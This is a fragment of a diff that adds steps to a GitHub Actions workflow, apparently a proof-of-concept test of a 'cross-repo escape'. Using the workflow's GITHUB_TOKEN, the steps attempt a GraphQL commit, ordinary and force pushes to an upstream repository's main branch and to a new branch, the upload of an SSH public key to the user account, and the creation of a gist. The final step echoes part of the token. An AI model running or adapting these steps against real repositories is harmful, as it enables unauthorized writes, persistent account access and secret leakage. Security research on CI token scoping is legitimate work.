+            'if .data.createCommitOnBranch.commit.oid then "COMMITTED:"+.data.createCommitOnBranch.commit.oid[:12] elif .errors then "ERR:"+.errors[0].message else "?" end' | head -c 80)
+          echo "U25 GQL createCommitOnBranch upstream = ${U25}"
+          echo ""
+          echo "--- git push to upstream ---"
+          git config user.email "bot@github.com" || true
+          git config user.name "bot" || true
+          git commit --allow-empty -m "cross-repo-escape" || true
+          U26=$(git push "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/heads/main 2>&1 | tail -1 || true)
+          echo "U26 git push upstream main = ${U26}"
+          U27=$(git push "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/heads/cross-${TS} 2>&1 | tail -1 || true)
+          echo "U27 git push upstream newbranch = ${U27}"
+          U28=$(git push --force "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/heads/main 2>&1 | tail -1 || true)
+          echo "U28 git force push upstream = ${U28}"
+          echo ""
+          echo "--- SSH keys / gist on user account ---"
+          U29=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "https://api.github.com/user/keys" \
+            -d "{\"title\":\"cross\",\"key\":\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtQUDZWhs8JUEk9MiSeFf2DVrFCbcmTH x\"}")
+          echo "U29 POST user SSH key = HTTP_${U29}"
+          U30=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "https://api.github.com/gists" \
+            -d "{\"description\":\"x\",\"public\":false,\"files\":{\"x.txt\":{\"content\":\"cross\"}}}")
+          echo "U30 POST gist = HTTP_${U30}"
+          echo ""
+          echo "=== UPSTREAM CROSS-REPO SUMMARY ==="
+          echo "KEY: Any HTTP 200/201/204 on upstream write endpoint = CROSS-REPO ESCAPE"
+          echo "Fork token scoped to: ${GITHUB_REPOSITORY}"
+          echo "Upstream target: twrps/PoC-RACE2"
+
+      - name: Final summary
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== FINAL SUMMARY ==="
+          echo "Run complete. actor=${GITHUB_ACTOR} repo=${GITHUB_REPOSITORY}"
+          echo "token prefix: ${GH_TOKEN:0:10}"
+          echo "KEY: HTTP_200/201/204 on upstream write = CROSS-REPO ESCAPE"
